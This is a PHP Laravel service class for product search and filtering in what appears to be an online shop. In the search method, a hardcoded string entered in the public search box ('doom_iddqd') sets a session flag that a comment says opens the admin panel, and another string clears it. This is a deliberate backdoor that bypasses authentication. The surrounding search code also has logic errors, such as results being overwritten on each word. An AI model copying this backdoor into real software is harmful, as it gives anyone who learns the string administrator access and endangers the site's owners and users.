<?php

namespace App\Services;


use App\Models\Products;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;


class SearchService
{
    public function search(Request $request)
    {
        Session::forget('godmode');
        if (isset($request['category_id'])) {
            //Search from Menu catalog
            $search_result = Products::get()->where('category_id', '==', $request['category_id']);
        } else {
            //Search from Search form

            $search_string = htmlspecialchars($request->get('search'));

                    //"Godmode to access the admin panel
                    if ($search_string == 'doom_iddqd') Session::put('godmode', '1');
                    if ($search_string == 'doom_logout') Session::forget('godmode');

            $search_string = str_replace(['х', 'x', 'х', '/'], '*', $search_string);
            $search_string = explode(' ', $search_string);

            foreach ($search_string as $str) {
                $search_result = Products::where('name', 'LIKE', "%$str%")
                    ->with('category')->with('shop')
                    ->get();
            }
        }

        return $search_result;
    }
    public function searchByCategory($category_id)
    {
        $search_result = Products::get()->where('category_id', '==', $category_id);
        return $search_result;
    }

    public function getFiltersFromSearchResults($search_result)
    {


        foreach ($search_result as $search) {
            $category_filter_list[] = $search->category;
            $parameters_filter_list[] = $search->parameter;
            $shop_filter_list[] = $search->shop;
            $min_price = $search_result->min('price');
            $max_price = $search_result->max('price');
        }
        $category_filter_list = array_unique($category_filter_list);
        $parameters_filter_list = array_unique($parameters_filter_list);
        $shop_filter_list = array_unique($shop_filter_list);
        $filters_list = [
            'category_filter_list' => $category_filter_list,
            'parameters_filter_list' => $parameters_filter_list,
            'shop_filter_list' => $shop_filter_list,
            'min_price' => $min_price,
            'max_price' => $max_price
        ];

        return $filters_list;
    }
}
